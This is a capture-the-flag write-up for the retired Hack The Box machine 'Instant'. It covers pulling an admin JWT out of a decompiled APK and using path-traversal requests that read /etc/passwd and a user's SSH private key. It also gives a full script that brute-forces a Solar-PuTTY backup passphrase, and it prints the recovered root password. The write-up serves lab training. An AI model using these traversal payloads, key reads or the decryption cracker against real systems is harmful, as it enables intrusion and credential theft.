---
title: Instant
description: A token embedded in an APK opens an administrative API; a Solar-PuTTY
  backup reveals the root password.
platform: Linux
tags:
- APK reversing
- File read
- Solar-PuTTY
htb: https://app.hackthebox.com/machines/630
retirement:
  state: retired
  checked: '2026-11-17'
  evidence: https://labs.hackthebox.com/achievement/machine/2048041/630
---

# Instant

<div class="wu-meta" markdown="span">
<span class="wu-badge wu-os">:fontawesome-brands-linux: Linux</span>
<span class="wu-tags">
<span class="wu-tag">APK reversing</span>
<span class="wu-tag">File read</span>
<span class="wu-tag">Solar-PuTTY</span>
</span>
</div>

!!! abstract "What this box demonstrates"
    Directory fuzzing did not expose the useful endpoints. Decompiling the application did: the APK contained both a long-lived administrative token and hostnames for the API documentation. A session backup on the host later supplied root credentials.

## Attack path

1. Decompile the downloadable APK to recover an admin token and internal API hostnames.
2. Use log-file traversal to recover Shirohige's SSH private key.
3. Decrypt the Solar-PuTTY session backup and use its saved root credentials.

[HTB machine](https://app.hackthebox.com/machines/630) · [Official retirement evidence](https://labs.hackthebox.com/achievement/machine/2048041/630) (checked November 17, 2026).

## Enumeration

```fish
set -x IP 10.10.11.37

set ports (nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

# TCP Port Scan
sudo nmap -p$ports -sC -sV $IP -oG scan_tcp

# UDP Port Scan (intentionally does not use $port)
sudo nmap -sS -sU -p- $IP
```

## Nmap Results
Port 80 and 22 are open.

## Foothold
After adding `instant.htb` to our /etc/hosts file, we can navigate to the site and see that it's a development site for an APK file. 

Before downloading the APK, I searched for subdomains and directories of interest but did not find anything:
```text
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 instant.htb/FUZZ
```

```text
ffuf -u http://instant.htb -H "Host: FUZZ.instant.htb" -w /usr/share/seclists/Discovery/Web-Content/big.txt --fc 301
```

## APK Decompile
```bash
sudo apt install apktool -y
apktool d instant.apk -o instant
```

Once the apk file has been decompiled, begin to look around the directories and files for valuable information.

Notice the following file: `/smali/com/instantlab/instant/AdminActivities.smali`. Inside, we find the following hard-coded JWT token:
```text
 const-string v2, "Authorization"

    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

Let's open up Burp and throw this header into a request and save this. For now, we don't have any endpoints which require auth since wfuzz and ffuf did not turn up anything interesting.

In the same directory as `AdminActivities.smali`, we find another interesting file named `ProfileActivity.smali`. Reading this, we see another endpoint:
```text
const-string v7, "http://mywalletv1.instant.htb/api/v1/view/profile"
```

Let's add this to our /etc/hosts file, then try to access the endpoint.

We are blocked initially, but going into Burp, intercepting the request, then adding the Authorization header let's us into the endpoint without 403 response.

Digging around this for now did not turn up any interesting results, so I went back to enumerating the apk files. I noticed `/res/xml/network-security-config.xml` which lead me to the following:
```text
http://swagger-ui.instant.htb
```

I added the above to my /etc/hosts file and authorized using the Authorization token found earlier! Now, we know what API calls can be made, so let's pivot back to Burp.

Pull the following endpoint:
```http
GET /api/v1/admin/view/logs

Authorization: ...
```

To receive the following:
```json
{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}
```

Now, let's pull that log file:
```http
GET /api/v1/admin/read/log?log_file_name=1.log 
```

To receive the following:
```json
{"/home/shirohige/logs/1.log":["This is a sample log testing\n"],"Status":201}
```

We've got a user! More interestingly, we have a `log_file_name` parameter, which may be vulnerable to LFI. Let's attempt to read /etc/passwd:
```text
admin/read/log?log_file_name=../../../etc/passwd
```

This should return our /etc/passwd file!

Note: Anytime LFI is possible, try to obtain the `id_rsa` key from the user to access the target.

Now, we can attempt to find the `id_rsa` key for this user to access the target:
```http
GET /api/v1/admin/read/log?log_file_name=../.ssh/id_rsa 
```

This will return the full key! We can copy/paste into VSCode and do some clean up. Next, copy/paste the contents into another file, `id_rsa`, then make sure to use `chmod 600` before attempting to SSH:
```bash
ssh -i id_rsa shirohige@instant.htb
```

## Privilege escalation
Since we only have the SSH key for this user, we do not have a password and therefore cannot use `sudo`. Priv esc will have to be attempted another way.

Linpeas can be uploaded and evaluated for possible priv esc.

Notice that we have `Solar-PuTTY` installed on the target and the backup file for the sessions exist at:
```text
/opt/backups/Solar-PuTTY/sessions-backup.dat
```

To exfiltrate the file, we can use SCP since we have the `id_rsa` key:
```bash
scp -i id_rsa shirohige@instant.htb:/opt/backups/Solar-PuTTY/sessions-backup.dat .
```

The session backup is encrypted. The script below tests a wordlist and finds its passphrase, `estrella`, before recovering the saved login:
```python
import base64
import sys
from Cryptodome.Cipher import DES3
from Cryptodome.Protocol.KDF import PBKDF2

def decrypt(passphrase, ciphertext):
    data = ''
    try:
        # Decode the base64 encoded ciphertext
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[48:]

        # Derive the key using PBKDF2
        key = PBKDF2(passphrase, salt, dkLen=24, count=1000)

        # Create the Triple DES cipher in CBC mode
        cipher = DES3.new(key, DES3.MODE_CBC, iv)

        # Decrypt the data
        decrypted_data = cipher.decrypt(encrypted_data)

        # Remove padding (PKCS7 padding)
        padding_len = decrypted_data[-1]
        decrypted_data = decrypted_data[:-padding_len]

        # Convert the decrypted data to a string
        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())

    except Exception as e:
        print(f'Error: {e}')

    return data

if len(sys.argv) < 3:
    print(f'Usage: {sys.argv[0]} putty_session.dat wordlist.txt')
    exit(1)

with open(sys.argv[1]) as f:
    cipher = f.read()

with open(sys.argv[2]) as passwords:
    for i, password in enumerate(passwords):
        password = password.strip()
        decrypted = decrypt(password, cipher)
        print(f'[{i}] {password=}', end='\r')
        if 'Credentials' in decrypted:
            print(f'\r[{i}] {password=} {" " * 10}')
            print()
            print(decrypted)
            break
```

```bash
python3 solar_putty_decrypt.py sessions-backup.dat /usr/share/wordlists/rockyou.txt 

[103] password='estrella'           

{"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
```

Which now gives us the following root credentials:
`root:12**24nzC!r0c%q12`

We can easily switch to the user root and obtain the flag now!
```bash
su root
12**24nzC!r0c%q12
```

## Lessons learned

A compiled mobile application can disclose API hosts and reusable authorization material. The encrypted session backup was another credential store, and its weak passphrase made encryption insufficient protection.
